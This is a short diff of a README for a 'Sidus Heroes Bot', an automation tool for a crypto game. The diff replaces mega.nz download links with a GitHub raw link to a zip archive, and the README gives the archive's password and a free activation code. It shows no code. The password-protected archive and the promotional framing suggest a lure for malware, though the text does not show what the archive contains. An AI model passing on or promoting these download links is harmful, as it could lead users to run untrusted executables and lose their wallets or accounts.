@@ -3,7 +3,7 @@
 -------------
 
 
-# [>>>⚡️ Click to DOWNLOAD BOT ⚡<<<](https://mega.nz/file/AhhDwaZZ#-hlsl0Y887XDMct23_K9YBP7dboRjym5eheaxg8pFX8)
+# [>>>⚡️ Click to DOWNLOAD BOT ⚡<<<](https://github.com/cryptonite-bot/sidusheroes-bot/raw/main/SIDUS%20HEROES%20BOT.zip)
 # Password to archive: sidus
 ## 30 days free code activation (G35S-53MS-935L-2SQC)
 ![alt-текст](https://s2.coinmarketcap.com/static/img/coins/64x64/15463.png)
@@ -27,7 +27,7 @@
 Your hero automatically participates in battles!
 The bot uses all the skills of your hero
 
-## [⚡️Sidus Heroes Bot v.1.4](https://mega.nz/file/jnQ3kAaS#Sx8YzBPD7XZGaCwIQTukcJqyJdwRt_KI7eZpWdsk2SY)
+## [⚡️Sidus Heroes Bot v.1.4](https://github.com/cryptonite-bot/sidusheroes-bot/raw/main/SIDUS%20HEROES%20BOT.zip)
 * Fix timer error
 * Improved bot speed
 * Improved bot design
